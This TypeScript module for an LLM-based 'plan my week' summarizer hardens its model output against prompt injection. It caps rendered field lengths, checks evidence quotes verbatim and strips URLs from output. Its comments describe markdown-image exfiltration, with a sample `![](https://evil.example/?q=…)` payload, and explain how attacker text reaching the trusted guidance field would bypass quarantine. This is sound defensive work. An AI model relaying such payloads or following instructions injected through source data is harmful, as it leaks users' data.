// The Planner (ADR-0005): the plan-my-week task, built on the Summarizer. Pure
// domain. It owns the planning instructions, composes its task prose from the Brief
// contract (kinds + descriptions; ADR-0011), renders the Bundle into the
// summarizer's `data` string (the SOLE Untrusted<T> unwrap site, ADR-0004 §3), and
// attaches the trusted envelope to the summarizer's output. The Brief output schema
// itself lives in brief-contract.ts, the Zod source of truth.

import type { AnnotatedItem, Brief, Bucket, Bundle } from "./domain.ts";
import {
  BRIEF_OUTPUT_SCHEMA,
  KINDS,
  KIND_DESCRIPTIONS,
  SummarizerOutputSchema,
  type ExtractedItem,
  type SummarizerOutput,
} from "./brief-contract.ts";
import { unwrap } from "./trust.ts";
import { summarize } from "./summarize.ts";

// The per-kind bullet list is generated from the contract so the prose and the
// schema enum cannot drift (ADR-0011): the kinds and their meanings are spelled once.
const KIND_BULLETS = KINDS.map((k) => `    * "${k}" — ${KIND_DESCRIPTIONS[k]}`).join("\n");

const ITEM_RULES = `- "items": the salient work-items worth attention — curated, not every item.
  Classify each by "kind":
${KIND_BULLETS}
  For each item: a concise "summary" in your own words; optional "when" as human-phrased
  timing ("Thu 9am", "due Fri"); and "evidence" — a list of {source, quote} where "quote"
  is a short verbatim snippet from the source data and "source" is its source key.`;

const PLAN_TASK = `You are preparing a "plan my week" rundown from the user's work sources.
Read the data below and produce a curated planning brief:

- "summary": a short prose synthesis of where things stand across all sources. This is
  where cross-source connections surface (e.g. a mail thread and an issue about the same thing).
${ITEM_RULES}`;

// Chosen when the whole window is already in the past (e.g. --window last-week):
// the user is reviewing, not planning, so the synthesis looks back and the items
// that matter are what is still open, owed, or unresolved.
const REVIEW_TASK = `You are preparing a look-back rundown of a past window from the user's work sources.
Read the data below and produce a curated retrospective brief:

- "summary": a short prose synthesis of what happened and where things were left across all
  sources. This is where cross-source connections surface (e.g. a mail thread and an issue
  about the same thing). Write it as a review of the past window, and call out what is
  still open or unresolved.
${ITEM_RULES}
  Extract items even though the window is past — favor what carries forward: actions still
  owed, threads awaiting others, and unresolved questions.`;

const BUCKET_HEADERS: Record<Bucket, string> = {
  standing: "STANDING (open commitments untouched this window)",
  recent: "RECENT (activity within the window)",
  upcoming: "UPCOMING (still ahead)",
};

// ── Length caps on rendered source fields ──
//
// A hostile backend can hand the aggregator an arbitrarily large title/url/extras
// value; unbounded, that inflates the summarizer's context (cost/latency) and widens
// the injection surface handed to the model. Each rendered field is capped at
// `MAX_RENDERED_FIELD_LENGTH` chars, truncated with a visible marker so the
// truncation itself is legible in the rendered bundle (and, transitively, in any
// evidence quote drawn from it — `verifyEvidence`'s substring check runs against this
// already-truncated text, which is the intended interaction: truncation happens at
// render time, so verification automatically checks against the truncated content).
const MAX_RENDERED_FIELD_LENGTH = 2_000;
const TRUNCATION_MARKER = "…[truncated]";

function truncateField(value: string): string {
  if (value.length <= MAX_RENDERED_FIELD_LENGTH) return value;
  return `${value.slice(0, MAX_RENDERED_FIELD_LENGTH)}${TRUNCATION_MARKER}`;
}

/** Render one item, unwrapping its untrusted fields. This is the sole unwrap site. */
function renderItem(item: AnnotatedItem): string {
  const span = item.end ? `${item.timestamp} – ${item.end}` : item.timestamp;
  const lines = [
    `- [${item.source}/${item.kind}] ${span}`,
    `  title: ${truncateField(unwrap(item.title))}`,
  ];
  if (item.url) lines.push(`  url: ${truncateField(unwrap(item.url))}`);
  if (item.extras) {
    const extras = unwrap(item.extras);
    for (const [key, value] of Object.entries(extras)) {
      if (value === undefined || value === null) continue;
      const rendered = Array.isArray(value)
        ? value.join(", ")
        : typeof value === "object"
          ? JSON.stringify(value)
          : String(value);
      lines.push(`  ${key}: ${truncateField(rendered)}`);
    }
  }
  return lines.join("\n");
}

/** Render the whole Bundle into the summarizer's data string, grouped by bucket. */
export function renderBundle(bundle: Bundle): string {
  const buckets: Bucket[] = ["standing", "recent", "upcoming"];
  const sections: string[] = [`Window: ${bundle.window.from} to ${bundle.window.to}`];
  for (const bucket of buckets) {
    const items = bundle.items.filter((i) => i.bucket === bucket);
    if (items.length === 0) continue;
    sections.push(`\n## ${BUCKET_HEADERS[bucket]}\n${items.map(renderItem).join("\n")}`);
  }
  return sections.join("\n");
}

export class PlanError extends Error {
  constructor(message: string) {
    super(message);
    this.name = "PlanError";
  }
}

// ── Render-time exfiltration hardening ──
//
// Brief string fields (summary, item summary/when, evidence quote) are
// untrusted-derived (ADR-0004 §1) — the summarizer can be induced to relay hostile
// source bytes into them verbatim, including markdown image/link syntax such as
// `![](https://evil.example/?q=…)`. If a Brief ever lands on a markdown-rendering
// surface, that is zero-click exfiltration: the image tag auto-fetches on render.
// Settled policy is to defang ALL URLs — no allowlist, since a trusted-vs-hostile
// URL distinction can't be drawn from the string alone. This is a deterministic,
// pure post-parse transform (not a model instruction, so it can't be talked out of
// applying), run in `plan()` after `SummarizerOutputSchema.parse` over every output
// string field. The future upgrade path — a trusted structural `url` field copied
// by code alongside the defanged prose — is out of scope here (see ADR-0004 §5).
const MARKDOWN_IMAGE_RE = /!\[([^\]]*)\]\([^)]*\)/g;
const MARKDOWN_LINK_RE = /\[([^\]]*)\]\([^)]*\)/g;
const HTTPS_SCHEME_RE = /https:\/\//gi;
const HTTP_SCHEME_RE = /http:\/\//gi;

/**
 * Defang one string field: strip markdown image/link wrappers down to their visible
 * text (discarding the URL, not just neutralizing it), then neutralize any bare URL
 * scheme that remains — including one that was itself used as markdown link text
 * (e.g. `[https://evil.example](https://evil.example)`). Order matters: images are
 * stripped before links, since `![alt](url)` also matches the link pattern on its
 * `[alt](url)` tail. Honest text with no URLs passes through byte-identical.
 */
function defangText(text: string): string {
  const withoutMarkdown = text.replace(MARKDOWN_IMAGE_RE, "$1").replace(MARKDOWN_LINK_RE, "$1");
  return withoutMarkdown.replace(HTTPS_SCHEME_RE, "hxxps://").replace(HTTP_SCHEME_RE, "hxxp://");
}

/**
 * Apply `defangText` to every string field of the Summarizer's parsed output
 * (summary, each item's summary/when, each evidence quote). Pure transform of an
 * already-unwrapped, already-validated value — not a new `unwrap()` site (ADR-0004
 * §3).
 *
 * Note: this runs AFTER evidence-quote verification (see `verifyEvidence`
 * below), so verification checks quotes against what the summarizer actually saw,
 * and only the surviving, verified quotes get defanged for emission.
 */
function defangOutput(output: SummarizerOutput): SummarizerOutput {
  return {
    summary: defangText(output.summary),
    items: output.items.map((item) => ({
      ...item,
      summary: defangText(item.summary),
      ...(item.when !== undefined ? { when: defangText(item.when) } : {}),
      evidence: item.evidence.map((e) => ({ ...e, quote: defangText(e.quote) })),
    })),
  };
}

// ── Evidence-quote verbatim verification ──
//
// A `evidence.quote` is meant to be a real, attributed snippet (ADR-0005 §4's
// "injection quarantine") — but the summarizer could instead fabricate one that was
// never in any source, laundering it as if it were authoritative evidence. After the
// Zod parse, each quote is checked to be a substring of the rendered bundle string
// (the exact `data` handed to the summarizer). Both sides are normalized first
// (runs of whitespace collapsed to a single space) so an honest, line-wrapped quote
// still matches. Non-matching entries are DROPPED at the entry level; the item
// itself is kept (it may still have other, verified evidence, or none).
//
// Ordering vs. the defang transform above: verification MUST run first, against the
// bundle string as the summarizer actually saw it — defanging first would rewrite
// `https://` to `hxxps://` in the quote and make even an honest quote fail to match
// a bundle that still has the real scheme. So the pipeline in `plan()` is
// parse → verifyEvidence (against the undefanged bundle) → defangOutput (applied to
// the surviving, verified quotes). The final emitted quote is therefore both
// verified-verbatim (as sent) and defanged (as emitted).
function normalizeWhitespace(text: string): string {
  return text.replace(/\s+/g, " ").trim();
}

/**
 * Drop evidence entries whose `quote` is not a verbatim (whitespace-normalized)
 * substring of `renderedBundle`. Items are never dropped — only the unverifiable
 * evidence entries within them.
 */
function verifyEvidence(items: ExtractedItem[], renderedBundle: string): ExtractedItem[] {
  const haystack = normalizeWhitespace(renderedBundle);
  return items.map((item) => ({
    ...item,
    evidence: item.evidence.filter((e) => haystack.includes(normalizeWhitespace(e.quote))),
  }));
}

/**
 * Injectable dependencies — the seam that lets Planner tests drive real behavior with
 * a fake Summarizer instead of `mock.module()`, mirroring `SummarizeDeps`. The seam is
 * internal to the compiled binary, so ADR-0004's structural seal is untouched.
 */
export interface PlanDeps {
  /** The Summarizer, overridable for tests. Defaults to the real `summarize`. */
  summarize?: typeof summarize;
}

/**
 * Turn a Bundle into a Brief. Short-circuits an empty bundle (no model call);
 * otherwise renders the bundle, summarizes under the task + trusted guidance, and
 * attaches the trusted envelope. Fail-hard on summarizer failure (propagates).
 *
 * @param guidance Invariant: `guidance` is **user-authored only** — sourced
 *   from `config.json` / CLI flags (ADR-0007's `planning-guidance` seam), never
 *   derived from source content (Bundle items, `extras`, or anything an external
 *   backend can influence). It is concatenated straight into `instructions`, which
 *   becomes the summarizer's TRUSTED system-prompt instruction region (`summarize.ts`
 *   `hardening()` + `Task and guidance (trusted):`) — outside the `<untrusted-data>`
 *   delimiter the Layer-1 hardening keys on. Computing `guidance` from anything a
 *   hostile source could shape (e.g. "top issue title", "most common sender") would
 *   smuggle attacker-controlled bytes into the trusted instruction region and
 *   bypass the delimiter quarantine entirely — a strictly worse breach than a leaked
 *   `evidence.quote`, since instructions there are followed, not just described. Do
 *   not add a call site that builds `guidance` from a Bundle/NormalizedItem/Brief.
 */
export async function plan(
  bundle: Bundle,
  windowIsPast: boolean,
  guidance?: string,
  deps: PlanDeps = {},
): Promise<Brief> {
  const summarizeFn = deps.summarize ?? summarize;
  const envelope = { window: bundle.window, sources: bundle.sources };

  // Empty bundle → empty Brief, no model call (ADR-0005 §8).
  if (bundle.items.length === 0) {
    return { envelope, summary: "", items: [] };
  }

  const task = windowIsPast ? REVIEW_TASK : PLAN_TASK;
  const instructions = guidance
    ? `${task}\n\nAdditional guidance from the user:\n${guidance}`
    : task;

  const data = renderBundle(bundle);
  const output = await summarizeFn<SummarizerOutput>({
    instructions,
    data,
    schema: BRIEF_OUTPUT_SCHEMA,
    // Runtime shape-check the model output against the Zod contract (ADR-0011). The
    // API's structured-output config is best-effort; this is the hard guarantee, so
    // well-formed-but-wrong-shape output fails rather than flowing through untyped.
    parse: (value) => SummarizerOutputSchema.parse(value),
  });

  // Evidence verification then defanging, in that order — see the comments above each function for why.
  const verifiedItems = verifyEvidence(output.items, data);
  const defanged = defangOutput({ summary: output.summary, items: verifiedItems });
  return { envelope, summary: defanged.summary, items: defanged.items };
}
